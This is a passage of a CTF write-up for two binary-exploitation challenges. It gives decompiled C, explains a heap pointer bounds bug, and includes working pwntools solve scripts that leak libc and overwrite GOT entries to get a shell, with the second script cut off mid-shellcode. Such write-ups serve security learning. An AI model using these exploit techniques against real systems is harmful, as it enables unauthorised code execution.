</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v6 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open_hook</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a2 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not sus: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">reset</span>(v6);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please decide what to do with this file: sus/not&#34;</span>);
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read_line</span>(v6);
</span></span><span style="display:flex;"><span>    buffer <span style="color:#f92672">=</span> v6<span style="color:#f92672">-&gt;</span>buffer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>buffer <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buffer[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;u&#39;</span> <span style="color:#f92672">&amp;&amp;</span> buffer[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;SUS ALERT!!!: %s!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlink</span>(a1);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not sus: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Go to the main function, it starts by opening the file <code>/proc/self/fd/0</code>, and then the <code>buffer</code> we enter will be passed to the <code>sus_open</code> function if it has the <code>sus</code> prefix. If not, it will reset <code>cap_size</code> to 0x10, and perform a re-reading from the beginning</p>
<h2 id="bug">Bug</h2>
<p>In the <code>read_file</code> function, it&rsquo;s called <code>regalloc</code> if the size is larger than the cap size, if our input has a null byte or newline, it stops reading and resets to read again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">read_file</span>(susfile <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> a1<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">reset</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">&gt;=</span> a1<span style="color:#f92672">-&gt;</span>buf_cap )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">resize</span>(a1, a1<span style="color:#f92672">-&gt;</span>buf_cap <span style="color:#f92672">+</span> <span style="color:#ae81ff">256</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">&gt;=</span> a1<span style="color:#f92672">-&gt;</span>buf_cap )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;fileinfo-&gt;buf_size &lt; fileinfo-&gt;buf_cap&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x10Bu</span>, <span style="color:#e6db74">&#34;susfile_read_in&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">susfile_get_buffer_end</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">syscall</span>(<span style="color:#ae81ff">0LL</span>, fd, v3, <span style="color:#ae81ff">1LL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;res == 1&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x10Fu</span>, <span style="color:#e6db74">&#34;susfile_read_in&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>v3 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!*</span>v3 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>a1<span style="color:#f92672">-&gt;</span>buf_size;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So, if the buffer equal to top_ptr, it updates the top_ptr without checking the &lsquo;pointer&rsquo; has exceeded the bound.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">&amp;</span>a1[a2] <span style="color:#f92672">==</span> top )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    top <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>a1[a3];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a1;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h2 id="solution">Solution</h2>
<p>I trigger the bug to overwrite the top_ptr to <code>strlen_got</code></p>
<p><img src="https://imgur.com/WexYRIR.png" alt="image"></p>
<p>My idea is to overwrite the memset function with the <code>puts</code> function, and the <code>top_ptr</code> now points to the <code>alarm_got</code>.</p>
<p><img src="https://imgur.com/OFrcqS9.png" alt="image"></p>
<p>So, the next <code>galloc</code> will print our gift =))</p>
<p><img src="https://imgur.com/1f6zxoU.png" alt="image"></p>
<p>The custom heap struct is beneath the GOT region, so I easily overwrite the <code>readline</code> function pointer with my one_gadget. Fortunately, there is the one that satisfies the condition.</p>
<p><img src="https://imgur.com/TbG73to.png" alt="image"></p>
<h2 id="solve-script">Solve script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./sus?&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#34;suscall.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">505</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./sus?&#34;</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>ticket <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ticket{NiceDialup3334n24:Dc18ctaSmj_o6ck0WAO2-q7wSmUJ4w8-y719xXeqNBNGyC6t}&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>    cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    handle SIGALRM noignore
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    b*0x00000000004012E1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Ticket please: &#39;</span>, ticket)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>heap_top <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004064A0</span>
</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4040a0</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">928</span><span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x404038</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>p32(elf<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Looking for sus files...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#f92672">-</span>  <span style="color:#ae81ff">0xea540</span>
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xebc81</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><ul>
<li>flag{NiceDialup3334n24:6NhGAXbkoPeDnJtjEPTWpBbsZgIxEsrUL42Fu_0lKpltFBre0gRowaNOS0TTZh9GD1_kGlTw4X5JqdM4mF1g}</li>
</ul>
<h1 id="pwn---process_vm_readv-me-maybe">Pwn - process_vm_readv-me-maybe</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-2">Source-code overview</h2>
<p>In the main function, it&rsquo;s called <code>fork()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __pid_t v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">prctl</span>(<span style="color:#ae81ff">1499557217</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parent</span>(v4);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">child</span>(<span style="color:#ae81ff">1499557217LL</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>, v6);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>While the parent provides arbitrary reads and writes of the child&rsquo;s memory, the child installs seccomp, calls <code>mprotect</code> to make its code section has <code>rwx</code> permissions , then enters the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">child</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">map_and_seccomp</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">0x3E8u</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span>v0;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( v0 );
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="solution-1">Solution</h2>
<p>My idea is to use arbitrary reads and writes in parent processes to write our shellcode to the code section of the child process.</p>
<p>My shellcode makes 3 chains:</p>
<ul>
<li>Overwrite <code>stdin pointer</code> in the <code>bss()</code> section of parent to string <code>/bin/sh</code>.</li>
<li>Overwrite <code>setbuf_got</code> with <code>system</code></li>
<li>Overwrite <code>kill_got</code> with <code>init+4</code></li>
</ul>
<p>Get shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM / x86-64 / set emulate on <span style="color:#f92672">]</span>──────────────────────────────────────────────────────────────────────────
</span></span><span style="display:flex;"><span>   0x5d6760e8234d &lt;init+4&gt;     push   rax
</span></span><span style="display:flex;"><span>   0x5d6760e8234e &lt;init+5&gt;     mov    rdi, qword ptr <span style="color:#f92672">[</span>rip + 0x223b<span style="color:#f92672">]</span>     RDI, <span style="color:#f92672">[</span>stdin@GLIBC_2.2.5<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 0x73e0753d8678 ◂— 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span><span style="display:flex;"><span>   0x5d6760e82355 &lt;init+12&gt;    xor    ecx, ecx                          ECX <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>   0x5d6760e82357 &lt;init+14&gt;    mov    edx, <span style="color:#ae81ff">2</span>                            EDX <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>   0x5d6760e8235c &lt;init+19&gt;    xor    esi, esi                          ESI <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> ► 0x5d6760e8235e &lt;init+21&gt;    call   setvbuf@plt                 &lt;setvbuf@plt&gt;
</span></span><span style="display:flex;"><span>        stream: 0x73e0753d8678 ◂— 0x68732f6e69622f /* <span style="color:#e6db74">&#39;/bin/sh&#39;</span> */
</span></span><span style="display:flex;"><span>        buf: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        modes: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        n: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h2 id="solve-script-1">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>)
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./chall&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:    
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
</span></span><span style="display:flex;"><span>stack <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(stack))
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readv</span>(addr):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writev</span>(addr, value):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(value)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Address: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, hex(addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>readv(ret)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29d90</span>
</span></span><span style="display:flex;"><span>print(hex(libc))
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>
</span></span><span style="display:flex;"><span>readv(l)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Value: &#39;</span>)
</span></span><span style="display:flex;"><span>pie <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">12</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1484</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>readv_helper <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span>
</span></span><span style="display:flex;"><span>writev_helper <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14fc</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write_ <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>kk <span style="color:#f92672">=</span> write_
</span></span><span style="display:flex;"><span>print(hex(write_))
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
